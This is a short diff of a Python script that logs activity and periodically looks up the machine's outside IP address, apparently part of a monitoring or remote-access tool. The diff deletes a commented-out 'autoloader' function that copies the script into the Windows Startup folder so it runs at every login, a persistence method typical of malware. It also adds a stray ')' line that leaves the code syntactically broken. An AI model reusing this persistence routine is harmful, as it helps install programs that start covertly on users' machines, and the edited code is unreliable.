@@ -22,20 +22,7 @@ TIME_1 = 10.0
 log = []
 log_dir = ""
 logging.basicConfig(filename = (log_dir + LOG_NAME), level = logging.DEBUG, format = '%(asctime)s: %(message)s') #format = '%(asctime)s: %(message)s'
-
-'''
-def autoloader():
-    if os.path.isdir('C:\\Users\\' + str(os.getlogin()) + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'):
-        PATH = 'C:\\Users\\' + str(os.getlogin()) + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-        shutil.copy(os.getcwd() + '\\' + NAME, PATH + '\\' + NAME)
-    elif os.path.isdir('C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup'):
-        PATH = 'C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup'
-        shutil.copy(os.getcwd() + '\\' + NAME, PATH + '\\' + NAME)
-    else:
-        pass
-
-autoloader()
-'''
+)
 
 def timer(time):
     t = threading.Timer(TIME_1, get_outside_ip)
